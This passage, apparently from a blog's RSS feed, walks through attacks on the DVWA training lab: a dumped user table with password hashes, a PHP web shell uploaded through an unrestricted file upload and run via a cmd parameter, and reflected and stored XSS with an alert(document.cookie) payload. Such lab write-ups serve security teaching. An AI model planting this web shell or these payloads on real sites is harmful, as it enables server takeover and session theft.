| 2       | gordonb | http://192.168.52.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
| 3       | 1337    | http://192.168.52.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
| 4       | pablo   | http://192.168.52.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
| 5       | smithy  | http://192.168.52.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;h2 id=&#34;6-file-upload:a278ed06f786dfe478032a0f72deba1a&#34;&gt;6. File Upload&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/up.png&#34; alt=&#34;File Upload&#34; /&gt;&lt;/p&gt;

&lt;p&gt;On the low security setting there are no restrictions on file upload. We can upload a php file containing simple code:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;PHP Shell&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(isset($_REQUEST[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;])){&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;$cmd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;($_REQUEST[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;cmd&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;system($cmd);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;lt;/pre&amp;gt;$cmd&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;die&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;../../hackable/uploads/shell.php succesfully uploaded!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can execute commands now via this shell:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/hackable/uploads/shell.php?cmd=ls -al&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;7-1-reflected-xss:a278ed06f786dfe478032a0f72deba1a&#34;&gt;7.1 Reflected XSS&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/xss.png&#34; alt=&#34;XSS&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here whatever we enter gets included into page source.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/cookie.png&#34; alt=&#34;Cookie&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;7-2-stored-xss:a278ed06f786dfe478032a0f72deba1a&#34;&gt;7.2 Stored XSS&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/xss2.png&#34; alt=&#34;XSS&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here the app is vulnerable to XSS again. However, this time the injected code is stored inside the database and is executed every time somebody visits the guestbook page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/stored.png&#34; alt=&#34;Stored XSS&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;summary:a278ed06f786dfe478032a0f72deba1a&#34;&gt;Summary&lt;/h2&gt;

&lt;p&gt;DVWA includes most common web server vulnerabilities and provides easy access to the vulnerable pieces of code. It is a great package for a beginner level pentest demo.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>